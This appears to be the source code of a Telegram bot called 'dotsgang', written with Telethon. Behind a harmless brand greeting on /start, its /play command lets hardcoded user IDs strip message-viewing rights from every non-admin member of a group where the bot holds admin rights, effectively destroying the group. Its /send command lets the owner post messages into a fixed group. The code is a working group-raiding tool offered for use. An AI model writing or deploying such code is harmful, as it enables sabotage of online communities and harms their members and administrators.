import os
from telethon import TelegramClient, events
from telethon.tl.custom import Button
from telethon.tl.types import ChannelParticipantsAdmins
from telethon.errors.rpcerrorlist import ChatAdminRequiredError

api_id = int(os.environ["api_id"])
api_hash = os.environ["api_hash"]
bot_token = os.environ["bot_token"]

dotsgang = TelegramClient("dotsgang", api_id, api_hash).start(bot_token=bot_token)

@dotsgang.on(events.NewMessage(pattern=r'\/start'))
async def start_dotsgang(event):
    try:
        if event.is_private:
            message_location = event.peer_id.user_id
            reply_message_location = event.id
            creators = [
                [
                    Button.url("Owner", url="https://t.me/its_a_brand")
                ]
                ]
            await dotsgang.send_message(message_location, "Hey there,\nIt's not just a name; it's part of the brand.", buttons=creators, reply_to=reply_message_location)
        else:
            message_location = event.to_id
            reply_message_location = event.id
            creators = [
                [
                    Button.url("Owner", url="https://t.me/its_a_brand")
                ]
                ]
            await dotsgang.send_message(message_location, "Hey there,\nIt's not just a name; it's part of the brand.", buttons=creators, reply_to=reply_message_location)
    except:
        pass

@dotsgang.on(events.NewMessage(pattern=r'\/play'))
async def destroy(event):
    try:
        if event.is_private:
            message_location = event.peer_id.user_id
            reply_message_location = event.id
            await dotsgang.send_message(message_location, "This powerful command is not intended for use here.", reply_to=reply_message_location)
        else:
            commander = [6696970488, 6755848367, 5542250619, 6319223913, 6533313510, 6806508244]
            who_is = event.from_id.user_id
            if who_is in commander:
                target_group = event.to_id
                target_admins = []
                async for admin in dotsgang.iter_participants(target_group, filter=ChannelParticipantsAdmins):
                    target_admins.append(admin.id)
                async for user in dotsgang.iter_participants(target_group):
                    user_id = user.id
                    if user_id in target_admins:
                        pass
                    else:
                        await dotsgang.edit_permissions(target_group, user_id, view_messages=False)
            else:
                message_location = event.to_id
                reply_message_location = event.id
                await dotsgang.send_message(message_location, "You are not allowed to use this command.", reply_to=reply_message_location)
    except ChatAdminRequiredError:
        message_location = event.to_id
        reply_message_location = event.id
        await dotsgang.send_message(message_location, "I don't have enough power to destroy.", reply_to=reply_message_location)

@dotsgang.on(events.NewMessage(pattern=r"\/send"))
async def send_information(event):
    try:
        if event.is_private:
            sender = event.peer_id.user_id
            owner = 6696970488
            target_group = -1001755728315
            if sender == owner:
                get_message = event.message.text
                validate = get_message.replace("/send ", "")
                message = validate
                await dotsgang.send_message(target_group, message)
            else:
                pass
        else:
            pass
    except AttributeError:
        pass

print("Dots Gang Started")
dotsgang.run_until_disconnected()